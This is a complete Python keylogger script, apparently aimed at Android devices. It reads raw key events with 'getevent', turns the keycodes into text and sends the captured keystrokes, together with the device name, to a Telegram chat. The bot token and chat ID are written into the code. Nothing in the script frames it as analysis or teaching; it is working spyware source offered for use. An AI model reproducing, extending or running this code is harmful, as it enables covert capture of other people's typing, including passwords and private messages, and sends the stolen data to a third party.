#!/usr/bin/env python3
import os, time, requests, subprocess, threading, queue, signal, sys
from datetime import datetime

TELEGRAM_BOT_TOKEN = "8706361168:AAG4yGsy9xeqtNE57zAjX7c1tCwOuKXpyzE"
TELEGRAM_CHAT_ID = "7623293200"
LOG_FILE = os.path.expanduser("~/.keylog.txt")
CHECK_INTERVAL = 1

class Keylogger:
    def __init__(self):
        self.buffer = []
        self.running = True
        self.session_id = f"KEYLOG_{int(time.time())}_{os.uname().nodename}"
    
    def telegram_send(self, msg):
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            requests.post(url, data={'chat_id': TELEGRAM_CHAT_ID, 'text': msg, 'parse_mode': 'HTML'}, timeout=5)
        except: pass
    
    def get_keys(self):
        try:
            result = subprocess.run(['getevent', '-lt', '/dev/input/event*'], capture_output=True, text=True, timeout=0.5)
            keys = []
            for line in result.stdout.split('\n'):
                if 'KEYCODE' in line:
                    code = line.split()[-1]
                    keys.append(self.key_map.get(code, ''))
            return ''.join(keys[-10:])
        except: return ''
    
    key_map = {
        'KEYCODE_A':'a','KEYCODE_B':'b','KEYCODE_C':'c','KEYCODE_D':'d','KEYCODE_E':'e','KEYCODE_F':'f',
        'KEYCODE_G':'g','KEYCODE_H':'h','KEYCODE_I':'i','KEYCODE_J':'j','KEYCODE_K':'k','KEYCODE_L':'l',
        'KEYCODE_M':'m','KEYCODE_N':'n','KEYCODE_O':'o','KEYCODE_P':'p','KEYCODE_Q':'q','KEYCODE_R':'r',
        'KEYCODE_S':'s','KEYCODE_T':'t','KEYCODE_U':'u','KEYCODE_V':'v','KEYCODE_W':'w','KEYCODE_X':'x',
        'KEYCODE_Y':'y','KEYCODE_Z':'z','KEYCODE_0':'0','KEYCODE_1':'1','KEYCODE_2':'2','KEYCODE_3':'3',
        'KEYCODE_4':'4','KEYCODE_5':'5','KEYCODE_6':'6','KEYCODE_7':'7','KEYCODE_8':'8','KEYCODE_9':'9',
        'KEYCODE_SPACE':' ','KEYCODE_ENTER':'\n','KEYCODE_DEL':'[DEL]'
    }
    
    def run(self):
        self.telegram_send(f"🚀 <b>KEYLOGGER STARTED</b>\n🆔 {self.session_id}\n📱 {os.uname().nodename}")
        while self.running:
            keys = self.get_keys()
            if keys:
                self.buffer.append(keys)
                if len(''.join(self.buffer)) > 30:
                    msg = f"🔑 <b>{self.session_id}</b>\n{''.join(self.buffer[-100:])}\n<i>{datetime.now().strftime('%H:%M:%S')}</i>"
                    self.telegram_send(msg)
                    self.buffer = []
            time.sleep(CHECK_INTERVAL)

kl = Keylogger()
def stop(sig, frame): kl.running = False; sys.exit(0)
signal.signal(signal.SIGINT, stop)
kl.run()

